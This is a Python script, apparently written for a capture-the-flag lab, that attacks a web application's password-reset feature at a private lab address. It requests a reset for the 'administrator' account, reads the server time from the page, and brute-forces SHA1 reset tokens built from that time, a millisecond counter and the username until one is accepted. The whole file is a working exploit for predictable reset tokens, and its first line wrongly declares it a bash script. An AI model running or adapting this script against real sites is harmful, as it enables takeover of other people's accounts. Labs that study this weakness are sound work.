#!/bin/bash

import datetime
import hashlib
import requests
import re

username = 'administrator'
base_url = 'http://10.10.227.89:8080/'

# Post request to /forgot_password with the username
data = {"username": username}
try:
    requests.post(base_url + "forgot_password", data=data)
except requests.RequestException as e:
    print(f"Error posting forgot password request: {e}")
    exit()

# Get current time from the base URL
try:
    response = requests.get(base_url)
    response.raise_for_status()  # Raise an error for bad status codes
except requests.RequestException as e:
    print(f"Error getting response from base URL: {e}")
    exit()

# Extract current time from the response text
time_pattern = r'The current time is (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'
match = re.search(time_pattern, response.text)
if match:
    current_time_str = match.group(1)
else:
    print("Current time not found in response")
    exit()

# Generate and test tokens
valid_tokens = []
for ms in range(100):
    ms_str = str(ms).zfill(2)  
    token_data = f"{current_time_str} . {ms_str} . {username.upper()}"
    hashed_token = hashlib.sha1(token_data.encode("utf-8")).hexdigest()
    
    # Test the token
    try:
        response = requests.get(base_url + 'password_reset', params={'token': hashed_token})
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error testing token {hashed_token}: {e}")
        continue

    if '<h2>Invalid token</h2>' not in response.text:
        print(f'Valid token: {hashed_token}')
        valid_tokens.append(hashed_token)

print("Valid tokens:", valid_tokens)

